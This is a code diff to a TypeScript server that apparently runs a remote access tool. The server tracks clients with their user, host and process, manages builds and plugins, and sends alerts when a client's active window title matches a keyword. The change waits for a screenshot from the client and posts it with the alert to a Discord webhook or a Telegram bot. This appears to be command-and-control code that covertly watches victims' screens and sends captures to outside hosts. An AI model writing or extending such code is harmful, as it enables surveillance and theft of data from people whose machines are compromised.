@@ -7,7 +7,7 @@ import { fileURLToPath } from "url";
 import path from "path";
 import fs from "fs/promises";
 import AdmZip from "adm-zip";
-import { upsertClientRow, setOnlineState, listClients, markAllClientsOffline, saveBuild, getBuild, getAllBuilds, deleteExpiredBuilds, deleteBuild, saveNotificationScreenshot, getNotificationScreenshot, clearNotificationScreenshots } from "./db";
+import { upsertClientRow, setOnlineState, listClients, markAllClientsOffline, saveBuild, getBuild, getAllBuilds, deleteExpiredBuilds, deleteBuild, saveNotificationScreenshot, getNotificationScreenshot, clearNotificationScreenshots, type NotificationScreenshotRecord } from "./db";
 import { handleFrame, handleHello, handlePing, handlePong } from "./wsHandlers";
 import { ClientInfo, ClientRole } from "./types";
 import { v4 as uuidv4 } from "uuid";
@@ -129,6 +129,9 @@ type PendingNotificationScreenshot = {
 
 const pendingNotificationScreenshots = new Map<string, PendingNotificationScreenshot>();
 
+const NOTIFICATION_SCREENSHOT_WAIT_MS = 5_000;
+const NOTIFICATION_SCREENSHOT_POLL_MS = 250;
+
 function takePendingNotificationScreenshot(clientId: string): PendingNotificationScreenshot | null {
   for (const [commandId, pending] of pendingNotificationScreenshots.entries()) {
     if (pending.clientId !== clientId) continue;
@@ -167,7 +170,31 @@ function storeNotificationScreenshot(
   }
 }
 
-async function postNotificationWebhook(record: NotificationRecord): Promise<void> {
+function getScreenshotMeta(format: string | undefined): { contentType: string; ext: string } {
+  const normalized = (format || "jpeg").toLowerCase();
+  if (normalized === "png") return { contentType: "image/png", ext: "png" };
+  if (normalized === "webp") return { contentType: "image/webp", ext: "webp" };
+  if (normalized === "jpg" || normalized === "jpeg") return { contentType: "image/jpeg", ext: "jpg" };
+  return { contentType: "application/octet-stream", ext: "bin" };
+}
+
+async function waitForNotificationScreenshot(
+  notificationId: string,
+  timeoutMs = NOTIFICATION_SCREENSHOT_WAIT_MS,
+): Promise<NotificationScreenshotRecord | null> {
+  const start = Date.now();
+  while (Date.now() - start < timeoutMs) {
+    const screenshot = getNotificationScreenshot(notificationId);
+    if (screenshot) return screenshot;
+    await new Promise<void>((resolve) => setTimeout(resolve, NOTIFICATION_SCREENSHOT_POLL_MS));
+  }
+  return null;
+}
+
+async function postNotificationWebhook(
+  record: NotificationRecord,
+  screenshot?: NotificationScreenshotRecord | null,
+): Promise<void> {
   const config = getNotificationConfig();
   if (!config.webhookEnabled) return;
   const url = (config.webhookUrl || "").trim();
@@ -183,25 +210,48 @@ async function postNotificationWebhook(record: NotificationRecord): Promise<void
 
   try {
     const isDiscord = /discord(app)?\.com$/i.test(new URL(url).hostname);
-    const payload = isDiscord
-      ? {
-          content: `🔔 Notification: ${record.title}`,
-          embeds: [
-            {
-              title: record.keyword ? `Keyword: ${record.keyword}` : "Active Window",
-              description: record.title,
-              fields: [
-                { name: "Client", value: record.clientId || "unknown", inline: true },
-                { name: "User", value: record.user || "unknown", inline: true },
-                { name: "Host", value: record.host || "unknown", inline: true },
-                { name: "Process", value: record.process || "unknown", inline: true },
-              ],
-              timestamp: new Date(record.ts).toISOString(),
-            },
-          ],
-        }
-      : { type: "notification", data: record };
+    if (isDiscord) {
+      const embed: Record<string, any> = {
+        title: record.keyword ? `Keyword: ${record.keyword}` : "Active Window",
+        description: record.title,
+        fields: [
+          { name: "Client", value: record.clientId || "unknown", inline: true },
+          { name: "User", value: record.user || "unknown", inline: true },
+          { name: "Host", value: record.host || "unknown", inline: true },
+          { name: "Process", value: record.process || "unknown", inline: true },
+        ],
+        timestamp: new Date(record.ts).toISOString(),
+      };
 
+      const payload: Record<string, any> = {
+        content: `🔔 Notification: ${record.title}`,
+        embeds: [embed],
+      };
+
+      if (screenshot?.bytes?.length) {
+        const meta = getScreenshotMeta(screenshot.format);
+        const filename = `notification-${record.id}.${meta.ext}`;
+        embed.image = { url: `attachment://${filename}` };
+        const form = new FormData();
+        form.append("payload_json", JSON.stringify(payload));
+        form.append(
+          "files[0]",
+          new Blob([screenshot.bytes], { type: meta.contentType }),
+          filename,
+        );
+        await fetch(url, { method: "POST", body: form });
+        return;
+      }
+
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
+      return;
+    }
+
+    const payload = { type: "notification", data: record };
     await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -212,7 +262,10 @@ async function postNotificationWebhook(record: NotificationRecord): Promise<void
   }
 }
 
-async function postTelegramNotification(record: NotificationRecord): Promise<void> {
+async function postTelegramNotification(
+  record: NotificationRecord,
+  screenshot?: NotificationScreenshotRecord | null,
+): Promise<void> {
   const config = getNotificationConfig();
   if (!config.telegramEnabled) return;
   const token = (config.telegramBotToken || "").trim();
@@ -220,8 +273,20 @@ async function postTelegramNotification(record: NotificationRecord): Promise<voi
   if (!token || !chatId) return;
 
   const text = `🔔 Notification\nTitle: ${record.title}\nKeyword: ${record.keyword || "-"}\nClient: ${record.clientId}\nUser: ${record.user || "unknown"}\nHost: ${record.host || "unknown"}\nProcess: ${record.process || "unknown"}`;
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
   try {
+    if (screenshot?.bytes?.length) {
+      const meta = getScreenshotMeta(screenshot.format);
+      const filename = `notification-${record.id}.${meta.ext}`;
+      const form = new FormData();
+      form.append("chat_id", chatId);
+      form.append("caption", text);
+      form.append("photo", new Blob([screenshot.bytes], { type: meta.contentType }), filename);
+      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+      await fetch(url, { method: "POST", body: form });
+      return;
+    }
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
     await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -230,6 +295,14 @@ async function postTelegramNotification(record: NotificationRecord): Promise<voi
   } catch (err) {
     logger.warn("[notify] telegram delivery failed", err);
   }
+}
+
+async function deliverNotificationWithScreenshot(record: NotificationRecord): Promise<void> {
+  const screenshot = await waitForNotificationScreenshot(record.id);
+  await Promise.allSettled([
+    postNotificationWebhook(record, screenshot),
+    postTelegramNotification(record, screenshot),
+  ]);
 }
 
 function requestNotificationScreenshot(info: ClientInfo | undefined, record: NotificationRecord) {
@@ -1539,8 +1612,7 @@ function handleNotification(clientId: string, payload: any) {
     safeSendViewer(session.viewer, { type: "notification", item: record });
   }
 
-  void postNotificationWebhook(record);
-  void postTelegramNotification(record);
+  void deliverNotificationWithScreenshot(record);
 }
 
 function markPluginLoaded(clientId: string, pluginId: string) {
